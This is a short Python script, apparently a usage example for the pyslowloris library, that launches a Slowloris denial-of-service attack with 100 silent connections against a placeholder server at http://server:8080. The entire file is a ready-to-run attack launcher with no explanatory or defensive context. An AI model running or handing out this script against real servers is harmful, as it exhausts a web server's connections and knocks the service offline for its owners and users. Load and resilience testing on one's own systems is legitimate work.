#!/usr/bin/env python

from pyslowloris import HostAddress, SlowLorisAttack

url = HostAddress.from_url("http://server:8080")
connections_count = 100

loris = SlowLorisAttack(url, connections_count, silent=True)
loris.start()
